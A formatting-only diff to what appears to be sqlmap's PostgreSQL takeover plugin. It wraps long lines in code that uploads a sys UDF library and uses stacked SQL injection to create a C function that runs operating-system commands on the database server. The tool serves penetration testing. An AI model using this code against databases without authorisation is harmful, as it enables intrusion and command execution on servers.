@@ -26,6 +26,7 @@ from lib.core.exception import SqlmapUnsupportedFeatureException
 from lib.request import inject
 from plugins.generic.takeover import Takeover as GenericTakeover
 
+
 class Takeover(GenericTakeover):
     def udfSetRemotePath(self):
         # On Windows
@@ -64,12 +65,14 @@ class Takeover(GenericTakeover):
 
         try:
             if Backend.isOs(OS.WINDOWS):
-                _ = os.path.join(self.udfLocalFile, "postgresql", "windows", "%d" % Backend.getArch(), majorVer, "lib_postgresqludf_sys.dll_")
+                _ = os.path.join(self.udfLocalFile, "postgresql", "windows", "%d" % Backend.getArch(), majorVer,
+                                 "lib_postgresqludf_sys.dll_")
                 checkFile(_)
                 self.udfLocalFile = decloakToTemp(_)
                 self.udfSharedLibExt = "dll"
             else:
-                _ = os.path.join(self.udfLocalFile, "postgresql", "linux", "%d" % Backend.getArch(), majorVer, "lib_postgresqludf_sys.so_")
+                _ = os.path.join(self.udfLocalFile, "postgresql", "linux", "%d" % Backend.getArch(), majorVer,
+                                 "lib_postgresqludf_sys.so_")
                 checkFile(_)
                 self.udfLocalFile = decloakToTemp(_)
                 self.udfSharedLibExt = "so"
@@ -86,7 +89,9 @@ class Takeover(GenericTakeover):
 
             # Reference: http://www.postgresql.org/docs/8.3/interactive/sql-createfunction.html
             inject.goStacked("DROP FUNCTION %s(%s)" % (udf, inp))
-            inject.goStacked("CREATE OR REPLACE FUNCTION %s(%s) RETURNS %s AS '%s', '%s' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE" % (udf, inp, ret, self.udfRemoteFile, udf))
+            inject.goStacked(
+                "CREATE OR REPLACE FUNCTION %s(%s) RETURNS %s AS '%s', '%s' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE" % (
+                udf, inp, ret, self.udfRemoteFile, udf))
 
             self.createdUdf.add(udf)
         else:
